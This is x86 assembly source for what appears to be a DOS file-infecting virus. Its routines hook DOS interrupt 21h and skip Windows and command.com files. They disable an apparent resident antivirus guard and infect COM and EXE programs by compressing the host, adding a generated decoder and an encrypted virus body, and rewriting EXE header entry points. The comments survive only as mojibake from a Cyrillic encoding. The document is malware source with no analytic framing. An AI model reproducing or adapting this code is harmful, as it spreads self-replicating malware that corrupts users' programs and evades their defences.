Infect_Thiz:
	mov cs:Int21sp,sp
	mov cs:Int21ss,ss
	push cs			; �����砥� ᢮� �⥪
	pop ss
	lea sp,stack

	pushad
	push es
	push ds

	mov si,dx
	cld
@it20:	lodsb
	or al,al
	jne @it20
	sub si,8
	lodsd
	cmp eax,'.683'	; ������� �ࠩ���� ��� ����� ⨯� krnl386 �祭�
	jz @it0		; ����� �᫨ �� ��ࠧ���
	and eax,0FFDFDFDFh
	cmp eax,'.NIW'
	jz @it0	
	cmp eax,'.DNA'	; �⮡� �� ��ࠦ��� command.com
	jz @it0
		
	push ds
	push dx
	
	push cs
	pop ds	
	call ChangeDTA
	call changeInt3
	call Remove_Guard
	call ChangeInt24
	mov bx,4096
	mov ah,48h
	@CallInt21	; �뤥�塞 ᥣ���� � 64� (���� �� ���-� ��娢�஢���)
	pop dx
	pop ds
	jc @it1
	mov cs:FileSeg,ax
	
	call OpenFile
	jc @it3
	
	mov ax,Header_ID
	lea si,InfectEXE
	cmp ax,'MZ'
	jz @it4
	cmp ax,'ZM'
	jz @it4
	lea si,InfectCOM
@it4:
	call si
	
	mov bx,cs:FileNum
	call Set_Time
	mov ah,3Eh		; ����뫨
	@CallInt21
	
@it3:	mov es,cs:FileSeg	; �᢮������ ���� �����
	mov ah,49h
	@CallInt21
	
@it1:	
	call RestoreInt24
	call Restore_Guard
	call RestoreInt3
	call RestoreDTA

@it0:
	pop ds
	pop es
	popad
	mov ss,cs:Int21ss	; ���� �⥪
	mov sp,cs:Int21sp	
	retn
	
	
InfectCOM:
	mov Exe_Flag,0
	xor cx,cx
	xor dx,dx
	mov ax,4202h
	@CallInt21

	or dx,dx	; ����� ���-䠩�� ����� 64� ��࠭��...
	jnz @ic1
	cmp ax,startfile*2 ; ᫨誮� �����쪨� �� ��ࠦ���
	jc @ic1
	mov dx,ax
	cmp ax,60000	; ᫨誮� ����訥 - ⮫쪮 ���� 60000 ����
	jc @ic2
	mov dx,60000
	
@ic2:	
	mov cs:read_pos,0
	call InfectBlock ; �����㥬 ����
	jc @ic1		; �᫨ �� ᡮ�, � ��室��.
	mov write_pos,0
	push es
	pop ds
	xor dx,dx
	mov cx,cs:FileLen
	
	call write_next
@ic1:
	retn

InfectBlock:
	mov cs:FileLen,dx
	mov ds,cs:FileSeg
	mov cx,dx
	mov dx,100h
	call Read_next
	xor di,di
	push ds
	pop es
	
	call ArjFile	; ��娢��㥬
	mov ax,cs:FileLen ; �᫨ �� ����娢�஢�����, � ��室��
	sub ax,di
	jc @ib1
	cmp ax,startfile ; �᫨ ���� ��娢�樨 ���� �� 墠⠥�
	jc @ib1
	cmp di,4096	; 䠩� 㦠��� ᫨誮� ��� - ����୮� ��
	jc @ib1		; �ਬ����. ��ࠦ��� �� �㤥�
	mov di,65534			; ����뫠�� ��ࠦ���� ���� ��
	mov si,65534-startfile		; ���� startfile
	mov cx,(65534-startfile)/2+1
	std
	rep movsw
	cld
	push cs
	pop ds
	mov ArcStart,startfile+100h	; �⮡� ����� ��㤠 �ᯠ���뢠��
	xor di,di
	call Make_Decoder	; ᮤ��� ��������� �������
	call MakeCodedVirus	; �����㥬 � ���㥬 ⥫� �����
	
	mov bx,FileNum
	clc
@ib1:
	retn
	
InfectEXE:
	mov Exe_Flag,1
	call PackThizEXE	; ��娢��㥬 �ਢ離�
	jc @ie1
	call Load_Header
	
	mov ax,Header_Len
	cwde
	shl ax,4
	mov read_pos,eax
	mov ax,Header_Pages
	dec ax
	shl eax,9
	xchg edx,eax
	mov ax,header_Last
	cwde
	add eax,edx
	sub eax,read_pos
	
	mov dx,60000
	cmp eax,60000
	jge @ie2
	cmp ax,startfile*2
	xchg ax,dx
	jc @ie1
@ie2:
	push read_pos
	mov ax,Header_sp
	mov Old_sp,ax
	mov ax,Header_ip
	mov Old_ip,ax
	mov ax,Header_cs
	mov Old_cs,ax
	mov ax,Header_ss
	mov Old_ss,ax
		
	call InfectBlock
	pop write_pos
	jc @ie1
	
	push es
	pop ds
	xor dx,dx
	mov cx,cs:FileLen
	call write_next
	push cs
	pop ds

	lea dx,header_id
	mov Header_ip,0
	mov header_cs,0
	mov Header_sp,startfile-10
	mov header_ss,0
	mov write_pos,0
	mov cx,1Ch
	call write_next	
@ie1:	
	retn
